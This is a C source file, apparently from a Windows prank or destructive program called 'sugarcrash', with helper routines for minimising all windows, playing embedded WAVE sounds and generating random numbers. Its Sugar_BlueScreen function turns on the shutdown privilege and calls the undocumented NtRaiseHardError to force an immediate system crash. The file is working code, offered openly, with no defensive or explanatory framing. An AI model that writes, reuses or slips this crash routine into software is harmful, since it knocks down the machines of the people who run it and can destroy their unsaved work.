#include "sugarcrash.h"

#include <Psapi.h>

#include "sugarntdecl.h"

/* https://github.com/reactos/reactos/blob/master/sdk/include/reactos/undocshell.h#L841 */
#define TRAYCMD_SHOW_DESKTOP    419

#define TRAYWINDOWCLASS         TEXT("Shell_TrayWnd")

static DWORD g_dwXorShiftState = 0;

VOID Sugar_BlueScreen(NTSTATUS ntErrorStatus)
{
    BOOLEAN             bEnabled;
    HARDERROR_RESPONSE  response;

    RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);

    NtRaiseHardError(
        ntErrorStatus, 0, 0, 0, OptionShutdownSystem, &response);
}

VOID Sugar_MinimizeAll(VOID)
{
    HANDLE hWnd = FindWindow(TRAYWINDOWCLASS, NULL);

    if (hWnd != NULL)
        SendMessage(hWnd, WM_COMMAND, (WPARAM)TRAYCMD_SHOW_DESKTOP, 0);
}

HGLOBAL Sugar_GetProcessResource(LPCTSTR lpName, LPCTSTR lpType)
{
    HMODULE     hMods[1024];
    HANDLE      hProcess = GetCurrentProcess();
    HANDLE      hResource = NULL;
    DWORD       cbNeeded;
    UINT        i;
    BOOL        bResult = FALSE;

    bResult = EnumProcessModules(hProcess, hMods, sizeof hMods, &cbNeeded);

    if (bResult == FALSE)
        return NULL;

    for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
    {
        hResource = FindResource(hMods[i], lpName, lpType);

        if (hResource != NULL)
            break;
    }

    if (hResource != NULL)
        return LoadResource(hMods[i], hResource);

    return NULL; 
}

BOOL Sugar_PlayWaveResource(LPCTSTR lpResName)
{
    LPCTSTR     lpWaveResource = NULL; 
    HANDLE      hWaveResource = NULL;
    BOOL        bResult = FALSE;

    if (lpResName == NULL)
        return FALSE;
 
    hWaveResource = Sugar_GetProcessResource(lpResName, TEXT("WAVE")); 
    
    if (hWaveResource == NULL)
        return FALSE;
    
    /* Извлекаем данные WAVE-ресурса, чтобы воспроизвести его */
    lpWaveResource = (LPCTSTR) LockResource(hWaveResource);

    if (lpWaveResource == NULL) {
        FreeResource(hWaveResource);
        return FALSE;
    }

    bResult = PlaySound(lpWaveResource, NULL, SND_MEMORY | SND_SYNC);

    UnlockResource(hWaveResource); 
    FreeResource(hWaveResource);

    return bResult;
}

/* https://en.wikipedia.org/wiki/Xorshift */
DWORD Sugar_Random(DWORD dwMin, DWORD dwMax)
{
    DWORD dwTemp = g_dwXorShiftState;

    if (dwTemp == 0)
        dwTemp = GetTickCount();

    dwTemp ^= dwTemp << 13;
    dwTemp ^= dwTemp >> 17;
    dwTemp ^= dwTemp << 5;

    g_dwXorShiftState = dwTemp;

    return dwMin + g_dwXorShiftState % (dwMax + 1 - dwMin);
}